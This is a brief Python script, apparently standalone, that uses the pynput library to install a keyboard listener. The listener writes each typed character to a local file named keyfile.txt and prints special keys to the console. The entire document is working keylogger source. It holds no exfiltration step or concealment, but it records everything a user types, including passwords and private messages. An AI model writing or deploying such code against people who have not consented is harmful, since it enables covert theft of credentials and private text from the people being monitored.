from pynput import keyboard
def Pressedkeys(key):
    try:
        char = key.char
        with open("keyfile.txt", 'a') as logKey:
            logKey.write(char)
    except AttributeError:
        print("Special key pressed: {0}".format(key))

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=Pressedkeys)
    listener.start()
    input()